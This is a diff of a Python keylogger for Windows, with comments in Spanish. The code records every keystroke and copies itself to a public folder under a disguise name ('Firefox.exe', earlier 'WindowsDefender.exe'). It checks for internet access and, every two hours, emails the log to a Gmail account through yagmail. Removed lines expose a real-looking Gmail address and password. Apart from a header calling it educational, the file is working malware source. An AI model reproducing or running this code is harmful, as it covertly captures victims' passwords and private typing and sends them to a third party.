@@ -1,29 +1,31 @@
-###################################
-# Keylogger to be used in Windows #
-###################################
+#################################################################
+# Developer by SebastianEPH                                     #
+#                                                               #
+# Script creado solo con fines educativos.                      #
+# No me hago responsable por un posible mal uso de éste script. #
+#                                                               #
+#################################################################
+
+# Librerías Utilizadas
 from pynput.keyboard import Key, Listener
 import pynput
+from getpass import getuser # Obtiene el nombre del usuario
 from datetime import datetime
+import datetime
 import os
-import time
 import yagmail
-from apscheduler.schedulers.blocking import BlockingScheduler
-from multiprocessing import Process
+import shutil
+# Librería verifica interent
+import socket
+import time
+# Hilos
 import threading
-from getpass import getuser
 
-############
-# Keylogger function
-# You can change the directory and/or name of the log "keylog.txt"
-# If no directory is entered but only file name, it saves where the keylogger is
-# Only emits new line/linebreak when user presses enter or Tab
-# Uses file write to insert into log, listener from pynput to grab keystrokes
-############
+# Obtiene registro de teclas y lo guarda en un archivo
 def Klogger():
-    
     log = os.environ.get(
         'pylogger_file',
-        os.path.expanduser('C:\\Users\\Public\\Security\\Windows Defender\\log.txt')
+        os.path.expanduser('C:\\Users\\Public\\log.txt')
     )
     mifecha = datetime.datetime.now()
     timi = "Fecha:      ["+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "]\nHora:       [" + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos]\n"
@@ -52,9 +54,43 @@ def Klogger():
                 f.write('{}'.format(key))
 
     with Listener(on_press=on_press) as listener:
-        listener.join()
+        listener.join() 
 
+# Envía los datos log por Gmail 
+def sendLog(log):
+    try:
+        ## Change correo
+        mifecha = datetime.datetime.now()
+        sender_email = "SoyElCorreoQueEnviaráLosRegistrosDeTeclas@gmail.com"
+        sender_password = "SoyUnaContraseña"
 
+        receiver_email = ["SoyElQueRecibiráLosRegistros@gmail.com"]
+        # Si deseas 2 a más destinatarios
+        # receiver_email = ["correo1@gmail.com", "correo2@hotmail.com"]
+        subject = "Dados del usuario: "+ str(getuser())
+        yag = yagmail.SMTP(user=sender_email, password=sender_password)
+        contenido = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
+        contents = [ 
+            "Información:\n\nNombre de Usuario: "+ str(getuser()) + contenido
+        ]
+        yag.send(receiver_email, subject, contents, attachments=log )
+        print("**************Se envió****************")
+        return True;
+    except:
+        print("___________________No se envió________________")
+        return False
+
+# Renombre el archivo log, antes de ser envíado
+def Rename(name):
+    try:
+        
+        # Copia el archivo 
+        Original = "C:\\Users\\Public\\log.txt"
+        New= "C:\\Users\\Public\\"+ name + ".txt"
+        os.rename(Original, New)
+    except:
+        pass
+# Verifica si hay conexión a internet para poder envíar el log
 def VerificarConexion():
     #creamos el socket de conexion
     con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -70,69 +106,28 @@ def VerificarConexion():
         return False
     #cierra el conector
     con.close()
+
+# Cópia él Keylogger a la carpeta oculta 
 def CopyKey():
-    
-    filePath = "WindowsDefender.exe", "C:\\Users\\Public\\Security\\Windows Defender\\WindowsDefender.exe"
+    nameKey = "Firefox.exe"
+    filePath = "C:\\Users\\Public\\"+ nameKey
 
     try:
-         #Verificar si el archivo existe 
-        
+         #Verificar si el archivo se encuentra copiado en el sistema
         with open(filePath, 'r') as f:
-            print("El archivo Existe")
+            print("El keylogger ya se encuentra en la carpeta oculta")
     except :
-        print("El archivo no existe")
+        print("El Keylogger no se encuentra en la carpeta oculta")
+        print("Se tratará de copiarlo")
         try:
-            import shutil
-            shutil.copy(filePath)
+            shutil.copy(nameKey , filePath)
             #Copia el keylogger a la carpeta especifica,
             #Solos si no existe
-            print("Se creó el Archivo")
+            print("Exito al copiar el keylogger a una carpeta oculta correctamente ")
         except:
-            print("No se puedo crear el archivo")
-       
+            print("No se puedo copiar el keylogger en la carpeta oculta correctamente ")
 
-def Rename(name):
-    # Copia el archivo 
-    Original = "C:\\Users\\Public\\Security\\Windows Defender\\log.txt"
-    New= "C:\\Users\\Public\\Security\\Windows Defender\\"+ name + ".txt"
-    os.rename(Original, New)
-
-
-
-###############
-# Function using yagmail to send the log file
-# This email is open to testing purposes for the next 2 weeks
-###############
-def sendLog(log):
-    try:
-        mifecha = datetime.datetime.now()
-        sender_email = "kloggertest42069@gmail.com" #Insert your email here
-        receiver_email = "kloggertest42069@gmail.com" #and here
-
-        # Si deseas enviar a más de 2 correo a la vez, usa esa parte del script
-        #receiver_email = ["Correo1@gmail.com", "Correo2@gmail.com", "Correo2@gmail.com"] 
-
-        subject = "Data | User:  "+ str(getuser()) 
-        sender_password = "rotkiv1234" #email password here
-
-        yag = yagmail.SMTP(user=sender_email, password=sender_password)
-        contenido = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
-        contents = [ 
-            "Información:\n\nNombre de Usuario: "+ str(getuser()) + contenido
-        ]
-        yag.send(receiver_email, subject, contents, attachments=log )
-        print("Se envió")
-        return True;
-    except:
-        print("No se envió")
-        return False
-
-################
-# Function to schedule email
-# Can set different intervals for testing purposes
-# f.x "seconds = 30" to set the interval to 30 seconds
-# After sending the log, deletes the log and we start a new one
-################
+# Intervalo de tiempo que se enviará el archivo log.txt
 def mailInterval():
     n = 1   # Para renombre los archivos
     while (True):
@@ -140,8 +135,6 @@ def mailInterval():
         # Enviar cada 2 horas aprox
         for x in range(720):    #720
             time.sleep(10)
-            print("Pasó: "+ str(x*10))
-
         if VerificarConexion(): # Si hay conexión
             # Crea nombre del archivo
             nameFile = "log"+str(n)
@@ -149,7 +142,7 @@ def mailInterval():
             Rename(nameFile)    # para que las nuevas teclas se envien en el siguiente tomo
 
             #Envía el archivo renombrado
-            homedir = 'C:\\Users\\Public\\Security\\Windows Defender\\'+str(nameFile)+".txt"
+            homedir = 'C:\\Users\\Public\\'+str(nameFile)+".txt"
             print("Proceso de envío")
 
             # Verifica envío Correcto
@@ -169,20 +162,12 @@ def mailInterval():
             # No hará nada, y esperará que aya una conexión exitosa
             pass
 
-#################
-# Multi processing to run functions in parallel
-# Runs the actual Keylogger in process 1
-# Runs the scheduler and mail in process 2
-# WARNING : Altering this will break the program
-#################
+# Inicio multihilo
 if __name__ == '__main__':
-    #p2 = Process(target=mailInterval)
+    # Copía el programa a una carpeta escondida 
     CopyKey()
     p1 = threading.Thread(target=Klogger)
     p2 = threading.Thread(target=mailInterval)
     p2.start()
     p1.start()
-    #p1 = Process(target=Klogger)
     p1.join()
-    #p2.join()
-
